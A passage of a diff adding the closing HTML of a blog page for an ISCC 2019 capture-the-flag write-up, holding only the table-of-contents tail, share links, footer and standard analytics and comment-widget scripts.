class="toc-number">3.7.</span> <span class="toc-text">Rev04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5-1"><span class="toc-number">3.8.</span> <span class="toc-text">web5</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&text=ISCC 2019 WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&is_video=false&description=ISCC 2019 WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ISCC 2019 WP&body=Check out this article: http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&name=ISCC 2019 WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 1nv0k3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-131778492-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?da32760b25f029bfe0c4abfc646f5f7a";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'blog-tw5j2p4htr';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
